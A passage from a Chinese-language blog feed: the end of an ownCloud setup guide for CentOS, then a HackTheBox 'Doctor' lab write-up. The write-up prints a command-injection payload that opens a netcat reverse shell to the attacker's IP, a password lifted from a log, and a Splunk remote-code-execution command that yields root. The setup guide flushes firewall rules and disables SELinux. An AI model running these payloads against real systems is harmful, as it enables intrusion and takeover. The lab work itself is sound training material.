title="3.安装并配置Mariadb"></a>3.安装并配置Mariadb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/MariaDB.10x.repo</span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.3/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br><span class="line"></span><br><span class="line">yum install -y MariaDB-server MariaDB-client</span><br><span class="line"></span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl enable mariadb</span><br><span class="line"></span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line">create database ownclouddb;</span><br><span class="line">grant all privileges on ownclouddb.* to ownclouduser@localhost identified by &#x27;owncloudpwd&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h2 id="4-安装owncloud"><a href="#4-安装owncloud" class="headerlink" title="4.安装owncloud"></a>4.安装owncloud</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/owncloud.repo</span><br><span class="line">[OwnCloud_10.x]</span><br><span class="line">name=wnCloud Server Version 10.x (CentOS 7)</span><br><span class="line">type=rpm-md</span><br><span class="line">baseurl=http://download.owncloud.org/download/repositories/production/CentOS_7</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://download.owncloud.org/download/repositories/production/CentOS_7/repodata/repomd.xml.key</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">yum repolist</span><br><span class="line">yum clean expire-cache</span><br><span class="line">yum install owncloud -y</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="5-配置防火墙规则及SElinux或关闭"><a href="#5-配置防火墙规则及SElinux或关闭" class="headerlink" title="5.配置防火墙规则及SElinux或关闭"></a>5.配置防火墙规则及SElinux或关闭</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-service=http</span><br><span class="line">firewall-cmd --permanent --add-service=https</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">iptables -F</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure><h2 id="6-移动目录"><a href="#6-移动目录" class="headerlink" title="6.移动目录"></a>6.移动目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -a /var/www/html/owncloud/* /var/www/html/</span><br><span class="line">chown -R apache:apache home/</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="7-配置页面"><a href="#7-配置页面" class="headerlink" title="7.配置页面"></a>7.配置页面</h2><h3 id="（1）配置数据库用户等"><a href="#（1）配置数据库用户等" class="headerlink" title="（1）配置数据库用户等"></a>（1）配置数据库用户等</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151255716.png" class><h3 id="（2）登入"><a href="#（2）登入" class="headerlink" title="（2）登入"></a>（2）登入</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151643638.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-安装apache&quot;&gt;&lt;a href=&quot;#1-安装apache&quot; class=&quot;headerlink&quot; title=&quot;1.安装apache&quot;&gt;&lt;/a&gt;1.安装apache&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install httpd -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl start httpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl enable httpd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;2-安装配置PHP&quot;&gt;&lt;a href=&quot;#2-安装配置PHP&quot; class=&quot;headerlink&quot; title=&quot;2.安装配置PHP&quot;&gt;&lt;/a&gt;2.安装配置PHP&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install epel-release -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum-config-manager --enable remi-php72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Linux服务" scheme="https://lunamoore.github.io/categories/Linux%E6%9C%8D%E5%8A%A1/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>HTB-doctor</title>
    <link href="https://lunamoore.github.io/2020/10/18/HTB-doctor/"/>
    <id>https://lunamoore.github.io/2020/10/18/HTB-doctor/</id>
    <published>2020-10-18T08:57:53.000Z</published>
    <updated>2021-01-15T11:56:49.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00简述"><a href="#0x00简述" class="headerlink" title="0x00简述"></a>0x00简述</h2><img src="/2020/10/18/HTB-doctor/image-20201018151933161.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了22/80/8089端口，8089对应的服务为splunk</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nmap -sC -sV -sT 10.10.10.209 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 03:21 EDT</span><br><span class="line">Nmap scan report for 10.10.10.209</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.68 seconds</span><br><span class="line">root@JIYE:~/htb/doctor#</span><br></pre></td></tr></table></figure><h2 id="0x02-先访问80端口"><a href="#0x02-先访问80端口" class="headerlink" title="0x02.先访问80端口"></a>0x02.先访问80端口</h2><p><code>同样的配方同样的味道，添加一条hosts  [doctors.htb    10.10.10.209]</code></p><img src="/2020/10/18/HTB-doctor/image-20201018152818636.png" class><h2 id="0x03-访问doctors-htb"><a href="#0x03-访问doctors-htb" class="headerlink" title="0x03.访问doctors.htb"></a>0x03.访问doctors.htb</h2><h3 id="1-尝试简单注入，可是没有。"><a href="#1-尝试简单注入，可是没有。" class="headerlink" title="1.尝试简单注入，可是没有。"></a>1.尝试简单注入，可是没有。</h3><img src="/2020/10/18/HTB-doctor/image-20201018154218860.png" class><h3 id="2-注册用户"><a href="#2-注册用户" class="headerlink" title="2.注册用户"></a>2.注册用户</h3><img src="/2020/10/18/HTB-doctor/image-20201018154351730.png" class><h3 id="3-登入"><a href="#3-登入" class="headerlink" title="3.登入"></a>3.登入</h3><img src="/2020/10/18/HTB-doctor/image-20201018154434150.png" class><h3 id="4-手动爬虫"><a href="#4-手动爬虫" class="headerlink" title="4.手动爬虫"></a>4.手动爬虫</h3><p><code>发现而已提交留言，感觉到存储型XSS的味道。。。</code></p><img src="/2020/10/18/HTB-doctor/image-20201018154824325.png" class><h3 id="5-构建XSS代码反弹shell"><a href="#5-构建XSS代码反弹shell" class="headerlink" title="5.构建XSS代码反弹shell"></a>5.构建XSS代码反弹shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.17.216/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="attr">10.10.17.216</span>&#x27;$<span class="attr">IFS</span>&#x27;<span class="attr">6666</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p><code>kali先监听6666</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>提交</code></p><img src="/2020/10/18/HTB-doctor/image-20201018155733291.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 38714</span><br><span class="line">whoami</span><br><span class="line">web</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">web@doctor:~$ </span><br></pre></td></tr></table></figure><h3 id="6-升级shell"><a href="#6-升级shell" class="headerlink" title="6.升级shell"></a>6.升级shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/doctor# stty raw -echo</span><br><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">web@doctor:~$ </span><br><span class="line">web@doctor:~$ pwd</span><br><span class="line">/home/web</span><br><span class="line">web@doctor:~$</span><br></pre></td></tr></table></figure><h2 id="0x04-登入到shaun用户"><a href="#0x04-登入到shaun用户" class="headerlink" title="0x04.登入到shaun用户"></a>0x04.登入到shaun用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~$ cd /home/</span><br><span class="line">web@doctor:/home$ ls</span><br><span class="line">shaun  web</span><br><span class="line">web@doctor:/home$ cd shaun/</span><br><span class="line">web@doctor:/home/shaun$ ls</span><br><span class="line">user.txt</span><br><span class="line">web@doctor:/home/shaun$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">web@doctor:/home/shaun$</span><br></pre></td></tr></table></figure><p><code>爬取文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~/blog$ cd /var/www/html/ </span><br><span class="line">web@doctor:/var/www/html$ ls</span><br><span class="line">about.html  contact.html  departments.html  images      js</span><br><span class="line">blog.html   css           fonts             index.html  services.html</span><br><span class="line">web@doctor:/var/www/html$ cd /var/lo</span><br><span class="line">local/ lock/  log/   </span><br><span class="line">web@doctor:/var/www/html$ cd /var/log/apache2/</span><br><span class="line">web@doctor:/var/log/apache2$ ls</span><br><span class="line">access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz</span><br><span class="line">access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz</span><br><span class="line">access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz</span><br><span class="line">access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz</span><br><span class="line">access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz</span><br><span class="line">access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log</span><br><span class="line">access.log.3.gz   error.log        error.log.3.gz</span><br><span class="line">access.log.4.gz   error.log.1      error.log.4.gz</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup </span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;\x16\x03&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;t3 12.1.2\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;PROPFIND / HTTP/1.1&quot; 405 521 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 453 &quot;-&quot; </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">省略一大堆。。。</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup | grep pass</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;</span><br><span class="line">web@doctor:/var/log/apache2$ </span><br></pre></td></tr></table></figure><p><code>得到shaun密码[Guitar123]，登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:/var/log/apache2$ su shaun</span><br><span class="line">Password: </span><br><span class="line">shaun@doctor:/var/log/apache2$ whoami</span><br><span class="line">shaun</span><br><span class="line">shaun@doctor:/var/log/apache2$ </span><br><span class="line">shaun@doctor:/var/log/apache2$ cd</span><br><span class="line">shaun@doctor:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">shaun@doctor:~$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">shaun@doctor:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h2><h3 id="1-shaun没有权限"><a href="#1-shaun没有权限" class="headerlink" title="1.shaun没有权限"></a>1.shaun没有权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shaun@doctor:/home/web$ sudo -l</span><br><span class="line">[sudo] password for shaun: </span><br><span class="line">Sorry, user shaun may not run sudo on doctor.</span><br><span class="line">shaun@doctor:/home/web$</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xY2VhOTViYjM1OGM=">什么是splunk<i class="fa fa-external-link-alt"></i></span></p><h3 id="2-利用splunk提权地址"><a href="#2-利用splunk提权地址" class="headerlink" title="2.利用splunk提权地址"></a>2.利用splunk提权<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyLmdpdA==">地址<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# git clone https://github.com/cnotin/SplunkWhisperer2</span><br><span class="line">正克隆到 &#x27;SplunkWhisperer2&#x27;...</span><br><span class="line">remote: Enumerating objects: 7, done.</span><br><span class="line">remote: Counting objects: 100% (7/7), done.</span><br><span class="line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="line">remote: Total 55 (delta 1), reused 2 (delta 1), pack-reused 48</span><br><span class="line">展开对象中: 100% (55/55), 20.68 KiB | 162.00 KiB/s, 完成.</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# ls</span><br><span class="line">nmap.CVT  SplunkWhisperer2  user</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# cd SplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# ls</span><br><span class="line">LICENSE  PySplunkWhisperer2  README.md  SharpSplunkWhisperer2</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# cd PySplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# proxychains pip2 install -r requirements.txt </span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span><br><span class="line">Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1)) (2.22.0)</span><br><span class="line">|DNS-request| pypi.org </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| pypi.org is 151.101.64.223</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.64.223:443-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">WARNING: You are using pip version 20.2.2; however, version 20.2.4 is available.</span><br><span class="line">You should consider upgrading via the &#x27;/usr/bin/python2 -m pip install --upgrade pip&#x27; command.</span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# chmod +x PySplunkWhisperer2_remote.py </span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2#</span><br></pre></td></tr></table></figure><p><code>查看使用方法</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyL2Jsb2IvbWFzdGVyL1B5U3BsdW5rV2hpc3BlcmVyMi9SRUFETUUubWQ=">readme<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-kali先监听8888"><a href="#3-kali先监听8888" class="headerlink" title="3.kali先监听8888"></a>3.kali先监听8888</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.17.216 --username shaun --password Guitar123 --payload &#x27;nc.traditional -e/bin/bash &#x27;10.10.17.216&#x27; &#x27;8888&#x27;&#x27;</span><br><span class="line">Running in remote mode (Remote Code Execution)</span><br><span class="line">[.] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[.] Creating malicious app bundle...</span><br><span class="line">[+] Created malicious app bundle in: /tmp/tmpo7c3zpu6.tar</span><br><span class="line">[+] Started HTTP server for remote mode</span><br><span class="line">[.] Installing app from: http://10.10.17.216:8181/</span><br><span class="line">10.10.10.209 - - [18/Oct/2020 04:50:53] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">[+] App installed, your code should be running now!</span><br><span class="line"></span><br><span class="line">Press RETURN to cleanup</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-得到shell"><a href="#5-得到shell" class="headerlink" title="5.得到shell"></a>5.得到shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 49402</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">root@doctor:/# cd</span><br><span class="line">cd</span><br><span class="line">bash: cd: HOME not set</span><br><span class="line">root@doctor:/# ls</span><br><span class="line">ls</span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swapfile  usr</span><br><span class="line">root@doctor:/# ^Z       </span><br><span class="line">[1]+  已停止               nc -nvlp 8888</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line"></span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# cd /root/</span><br><span class="line">root@doctor:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@doctor:/root# cat root.txt </span><br><span class="line">***********************************</span><br><span class="line">root@doctor:/root#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00简述&quot;&gt;&lt;a href=&quot;#0x00简述&quot; class=&quot;headerlink&quot; title=&quot;0x00简述&quot;&gt;&lt;/a&gt;0x00简述&lt;/h2&gt;&lt;img src=&quot;/2020/10/18/HTB-doctor/image-20201018151933161.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cache]</title>
    <link href="https://lunamoore.github.io/2020/10/01/HTB-cache/"/>
    <id>https://lunamoore.github.io/2020/10/01/HTB-cache/</id>
    <published>2020-10-01T13:05:14.000Z</published>
    <updated>2020-10-01T13:15:18.187Z</updated>
    
